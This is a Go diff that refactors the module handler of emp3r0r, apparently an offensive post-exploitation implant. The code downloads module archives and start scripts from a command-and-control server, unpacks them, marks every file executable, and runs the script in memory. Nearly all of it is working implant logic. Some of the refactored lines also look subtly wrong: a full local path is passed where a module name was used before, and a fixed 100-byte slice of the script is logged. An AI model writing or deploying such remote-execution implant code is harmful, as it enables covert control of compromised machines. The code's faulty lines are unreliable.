@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"path/filepath"
 	"runtime"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
@@ -13,74 +14,99 @@ import (
 
 // moduleHandler downloads and runs modules from C2
 func moduleHandler(modName, checksum string) (out string) {
-	tarball := RuntimeConfig.AgentRoot + "/" + modName + ".tar.xz"
-	modDir := RuntimeConfig.AgentRoot + "/" + modName
-	start_script := "start.sh"
-	if runtime.GOOS == "windows" {
-		start_script = "start.ps1"
-	}
+	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
+	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
+	startScript := fmt.Sprintf("%s.%s", modName, getScriptExtension())
 
-	// if we have already downloaded the module, dont bother downloading again
-	if tun.SHA256SumFile(tarball) != checksum {
-		_, err := DownloadViaCC(modName+".tar.xz",
-			tarball)
-		if err != nil {
+	// in memory execution?
+	inMem := checksum == "in_mem"
+
+	if !inMem {
+		if err := downloadAndVerifyModule(tarball, checksum); err != nil {
+			return err.Error()
+		}
+
+		if err := extractAndRunModule(modDir, tarball); err != nil {
 			return err.Error()
 		}
 	}
 
+	out, err := runStartScript(startScript)
+	if err != nil {
+		return fmt.Sprintf("running start script: %v: %s", err, out)
+	}
+	return out
+}
+
+func getScriptExtension() string {
+	if runtime.GOOS == "windows" {
+		return "ps1"
+	}
+	return "sh"
+}
+
+func downloadAndVerifyModule(tarball, checksum string) error {
 	if tun.SHA256SumFile(tarball) != checksum {
-		log.Print("checksum failed, restarting...")
-		os.RemoveAll(tarball)
-		moduleHandler(modName, checksum)
-	}
-
-	// extract files
-	os.RemoveAll(modDir)
-	if err := archiver.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
-		return fmt.Sprintf("Unarchive module tarball: %v", err)
-	}
-
-	// download start.sh
-	payload, err := DownloadViaCC(start_script, "")
-	if err != nil {
-		return fmt.Sprintf("Downloading %s: %v", start_script, err)
-	}
-
-	// exec
-	pwd, err := os.Getwd()
-	if err != nil {
-		return fmt.Sprintf("pwd: %v", err)
-	}
-	err = os.Chdir(modDir)
-	if err != nil {
-		return fmt.Sprintf("cd to module dir: %v", err)
-	}
-
-	// process files in module archive
-	files, err := os.ReadDir("./")
-	if err != nil {
-		return fmt.Sprintf("Processing module files: %v", err)
-	}
-	for _, f := range files {
-		libs_tarball := "libs.tar.xz"
-		os.Chmod(f.Name(), 0o700)
-		if util.IsExist(libs_tarball) {
-			os.RemoveAll("libs")
-			err = archiver.Unarchive(libs_tarball, "./")
-			if err != nil {
-				return fmt.Sprintf("Unarchive %s: %v", libs_tarball, err)
-			}
+		if _, err := DownloadViaCC(tarball, tarball); err != nil {
+			return err
 		}
 	}
 
-	// run wrapper script in memory
-	out, err = RunModuleScript(payload)
+	if tun.SHA256SumFile(tarball) != checksum {
+		log.Print("Checksum failed, restarting...")
+		os.RemoveAll(tarball)
+		return downloadAndVerifyModule(tarball, checksum) // Recursive call
+	}
+	return nil
+}
 
-	// debug
-	log.Printf("Running %s:\n%s", start_script, payload)
+func extractAndRunModule(modDir, tarball string) error {
+	os.RemoveAll(modDir)
+	if err := archiver.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
+		return fmt.Errorf("unarchive module tarball: %v", err)
+	}
 
+	pwd, err := os.Getwd()
+	if err != nil {
+		return fmt.Errorf("pwd: %v", err)
+	}
 	defer os.Chdir(pwd)
 
-	return string(out)
+	if err := os.Chdir(modDir); err != nil {
+		return fmt.Errorf("cd to module dir: %v", err)
+	}
+
+	return processModuleFiles(modDir)
+}
+
+func processModuleFiles(modDir string) error {
+	files, err := os.ReadDir(modDir)
+	if err != nil {
+		return fmt.Errorf("processing module files: %v", err)
+	}
+
+	for _, f := range files {
+		if err := os.Chmod(filepath.Join(modDir, f.Name()), 0o700); err != nil {
+			return fmt.Errorf("setting permissions for %s: %v", f.Name(), err)
+		}
+
+		libsTarball := filepath.Join(modDir, "libs.tar.xz")
+		if util.IsExist(libsTarball) {
+			os.RemoveAll(filepath.Join(modDir, "libs"))
+			if err := archiver.Unarchive(libsTarball, modDir); err != nil {
+				return fmt.Errorf("unarchive %s: %v", libsTarball, err)
+			}
+		}
+	}
+	return nil
+}
+
+func runStartScript(startScript string) (string, error) {
+	payload, err := DownloadViaCC(startScript, "")
+	if err != nil {
+		return "", fmt.Errorf("downloading %s: %v", startScript, err)
+	}
+
+	log.Printf("Running %s:\n%s...", startScript, payload[:100])
+	return RunModuleScript(payload)
 }
